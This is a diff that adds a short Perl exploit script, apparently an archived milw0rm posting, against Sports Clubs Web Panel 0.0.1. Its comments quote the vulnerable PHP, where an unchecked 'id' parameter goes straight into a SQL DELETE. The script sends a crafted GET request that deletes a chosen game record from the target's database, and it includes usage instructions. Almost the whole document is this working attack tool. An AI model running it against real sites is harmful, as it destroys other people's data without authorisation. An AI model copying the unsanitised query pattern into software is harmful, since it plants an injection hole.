@@ -1,0 +1,56 @@
+#!/usr/bin/perl -W
+
+# Sports Clubs Web Panel 0.0.1 Remote Game Delete Exploit
+# File affected: include/draw-delete.php (id)
+
+# Vuln Code:
+
+# 06:  $did = $_GET['id'];
+# 08:  mysql_query("DELETE FROM draw WHERE did='$did'");
+
+# by ka0x <ka0x01 [at] gmail [dot] com>
+# D.O.M Labs - Security Researchers
+# - www.domlabs.org -
+#
+
+# ka0x@domlabs:~/codes$ ./sportspanel.pl http://localhost/sportspanel 3
+
+
+use LWP::UserAgent;
+
+my $host = $ARGV[0];
+my $did = $ARGV[1];
+
+die &_USAGE unless $ARGV[1];
+
+sub _USAGE
+{
+	die "
+	- Sports Clubs Web Panel 0.0.1 Remote Game Delete Exploit -
+	- by ka0x (www.domlabs.org)
+	
+	usage: ./$0 <host> <valid_game_id>
+	ex: ./$0 http://localhost/sportspanel 2
+	";
+}
+
+my $ua = LWP::UserAgent->new() or die;
+$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008072820 Firefox/3.0.1");
+
+my $req = HTTP::Request->new(GET => $host."/?p=draw-delete&id=".$did);
+my $res = $ua->request($req);
+my $con = $res->content;
+
+if ($res->is_success){
+	if($con =~ /$did/){
+		print "[+] The Game \"$did\" has been deleted from the database!\n";
+	}
+}
+
+else{
+	print "[-] Exploit Failed!";
+}
+
+__END__
+
+# milw0rm.com [2008-09-13]
